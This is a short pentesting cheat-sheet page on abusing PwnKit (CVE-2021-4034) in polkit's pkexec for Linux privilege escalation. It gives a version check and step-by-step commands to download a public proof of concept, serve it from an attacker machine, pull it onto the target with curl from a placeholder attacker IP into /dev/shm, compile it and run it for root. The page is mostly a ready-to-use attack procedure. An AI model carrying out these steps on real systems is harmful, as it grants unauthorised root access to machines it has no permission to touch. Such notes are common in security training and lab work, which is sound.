---
Primary_category: "[[LINUX PRIVESC]]"
title: "POLKIT ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *CVE-2021-4034*

> ***Pwnkit***

> ***[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034)***

> ***Affected Versions → 0.105 and lower***

##### *Enumeration*

```bash
pkexec --version
```

##### *Abuse*

***[Github PoC](https://github.com/arthepsy/CVE-2021-4034)***

###### *Setup*

- ***Downloading the exploit***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://github.com/arthepsy/CVE-2021-4034/raw/refs/heads/main/cve-2021-4034-poc.c' --output exploit.c
```

- ***Transferring the file***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit.c' --remote-name
```

- ***Compiling the binary***

```bash
gcc -o exploit ./exploit.c
```

```bash
chmod 700 ./exploit
```

If the target does not have the **`gcc`** utility available, we should compile an static binary from the attacker machine by performing an *static linking* to ensure maximum portability

To do so, simply run the following command to generate the static binary after cloning the *Github* repository

> ***From the attacker*** ⚔️

```bash
gcc -static -o exploit ./exploit.c
```

Then, all that remains is to transfer the binary to the target and run it

###### *Usage*

```bash
./exploit
```